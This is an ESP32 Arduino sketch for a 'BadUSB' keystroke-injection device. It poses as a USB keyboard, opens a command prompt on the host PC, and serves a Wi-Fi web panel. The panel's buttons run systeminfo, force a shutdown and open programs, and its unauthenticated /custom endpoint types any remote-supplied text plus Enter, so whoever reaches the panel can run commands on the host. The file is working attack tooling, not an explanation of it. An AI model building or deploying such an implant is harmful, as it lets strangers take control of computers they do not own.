#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include "usb_keyboard.hpp"

const char* ssid = "your_wifi_ssid";
const char* password = "your_wifi_password";

HIDkeyboard keyboard;
AsyncWebServer server(80);

void sendChar(char c) {
  uint8_t const conv_table[128][2] = { HID_ASCII_TO_KEYCODE };
  if (c < 0 || c > 127) return;

  uint8_t modifier = conv_table[c][0] ? KEYBOARD_MODIFIER_LEFTSHIFT : 0;
  uint8_t keycode = conv_table[c][1];

  keyboard.sendKey(keycode, modifier);
  delay(50);
  keyboard.sendKey(0, 0);  // release
  delay(20);
}

void sendString(const String& str) {
  for (size_t i = 0; i < str.length(); i++) {
    sendChar(str[i]);
  }
}

void openCMD() {
  while (!tud_hid_n_ready(0)) delay(10);

  keyboard.sendKey(HID_KEY_R, KEYBOARD_MODIFIER_LEFTGUI);
  delay(200);
  keyboard.sendKey(0, 0);
  delay(300);

  sendString("cmd\n");
}

void openNotepad() {
  keyboard.sendKey(HID_KEY_R, KEYBOARD_MODIFIER_LEFTGUI);
  delay(200);
  keyboard.sendKey(0, 0);
  delay(300);

  sendString("notepad\n");
}

void openBrowser() {
  openCMD();
  delay(1000);
  keyboard.sendKey(0, 0);
  delay(300);

  sendString("start https://www.microsoft.com\n");
}

void runSystemInfo() {
  openCMD();
  delay(1000);

  sendString("systeminfo\n");
}

void shutdownComputer() {
  openCMD();
  delay(1000);

  sendString("shutdown -s -f -t 60\n");
}

void initialPayload() {
  while (!tud_hid_n_ready(0)) delay(10);

  keyboard.sendKey(HID_KEY_R, KEYBOARD_MODIFIER_LEFTGUI);
  delay(500);
  keyboard.sendKey(0, 0);
  delay(500);

  sendString("cmd\n");
  delay(1000);

  sendString("echo BadUSB device connected successfully\n");
}

void setup() {
  Serial.begin(115200);
  keyboard.begin();

  delay(2000);

  WiFi.begin(ssid, password);
  Serial.println("\n[WiFi] Attempting to connect...");
  Serial.print("[WiFi] SSID: ");
  Serial.println(ssid);

  int attempts = 0;
  const int max_attempts = 40;  // 40 * 500ms = 20 seconds timeout

  while (WiFi.status() != WL_CONNECTED && attempts < max_attempts) {
    delay(500);
    attempts++;
    Serial.print(".");
    
    
    if (attempts % 5 == 0) {
      Serial.print(" ");
      Serial.print(attempts / 2);
      Serial.print("s");
    }
  }

  Serial.println();

  // Check final WiFi status
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[WiFi] ✓ Successfully connected!");
    Serial.print("[WiFi] Local IP: ");
    Serial.println(WiFi.localIP());
    Serial.print("[WiFi] Signal Strength: ");
    Serial.print(WiFi.RSSI());
    Serial.println(" dBm");
  } else {
    Serial.println("[WiFi] ✗ Failed to connect");
    Serial.print("[WiFi] Status Code: ");
    Serial.println(WiFi.status());
    Serial.println("[WiFi] Possible causes:");
    Serial.println("  - Incorrect SSID or password");
    Serial.println("  - WiFi network not available");
    Serial.println("  - ESP32 out of range");
    Serial.println("[WiFi] Continuing with initial payload only...");
  }

  delay(1000);

  initialPayload();
  delay(5000);

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/html", R"rawliteral(
      <!DOCTYPE html>
      <html>
      <head><title>ESP32 HID Control</title></head>
      <body>
        <h2>HID Control from Local Network</h2>

        <button onclick="fetch('/cmd')">Open CMD</button><br><br>

        <button onclick="fetch('/notepad')">Open Notepad</button><br><br>

        <button onclick="fetch('/browser')">Open Browser</button><br><br>

        <button onclick="fetch('/systeminfo')">Run systeminfo</button><br><br>

        <button onclick="fetch('/shutdown')">Shutdown PC</button><br><br>

        <input type="text" id="text" placeholder="Custom text">
        <button onclick="sendText()">Send Text</button>

        <script>
          function sendText() {
            let txt = document.getElementById('text').value;
            fetch('/custom?text=' + encodeURIComponent(txt));
          }
        </script>

      </body>
      </html>
    )rawliteral");
  });

  server.on("/cmd", HTTP_GET, [](AsyncWebServerRequest *request){
    openCMD();
    request->send(200, "text/plain", "CMD executed");
  });

  server.on("/notepad", HTTP_GET, [](AsyncWebServerRequest *request){
    openNotepad();
    request->send(200, "text/plain", "Notepad opened");
  });

  server.on("/browser", HTTP_GET, [](AsyncWebServerRequest *request){
    openBrowser();
    request->send(200, "text/plain", "Browser opened");
  });

  server.on("/systeminfo", HTTP_GET, [](AsyncWebServerRequest *request){
    runSystemInfo();
    request->send(200, "text/plain", "Systeminfo executed");
  });

  server.on("/shutdown", HTTP_GET, [](AsyncWebServerRequest *request){
    shutdownComputer();
    request->send(200, "text/plain", "Shutdown started");
  });

  server.on("/custom", HTTP_GET, [](AsyncWebServerRequest *request){
    if (request->hasParam("text")) {
      String txt = request->getParam("text")->value();
      sendString(txt + "\n");

      request->send(200, "text/plain", "Text sent with Enter");
    } 
    else {
      request->send(400, "text/plain", "Missing 'text' parameter");
    }
  });

  server.begin();
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[Server] ✓ Web server started successfully");
    Serial.print("[Server] Access at: http://");
    Serial.print(WiFi.localIP());
    Serial.println("/");
  } else {
    Serial.println("[Server] ⚠ Web server started (no WiFi connection)");
  }
}

void loop() {}